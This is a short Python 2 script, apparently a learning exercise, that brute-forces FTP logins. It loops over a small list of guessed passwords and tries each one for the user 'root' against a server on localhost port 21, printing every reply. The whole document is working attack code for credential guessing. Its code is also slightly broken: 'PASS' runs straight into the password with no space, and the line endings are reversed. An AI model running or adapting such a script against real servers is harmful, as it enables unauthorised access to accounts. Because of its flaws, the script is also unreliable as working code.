#!/usr/bin/python
from socket import *
wordlist = [
"sdfasf",
"sferw4",
"1",
"rt346grt6yg",
"dsfgteytsgr"
]
for i in wordlist:
	s = socket()
	#connect to ftp	
	s.connect(("127.0.0.1", 21))
	print s.recv(2048)
	s.send("USER root\n\r")
	#send user with username
	print s.recv(2048)
	#recive output
	s.send("PASS" + i + "\n\r")
	#send pass with password
	print s.recv(2048)
	#recive output
	s.close()
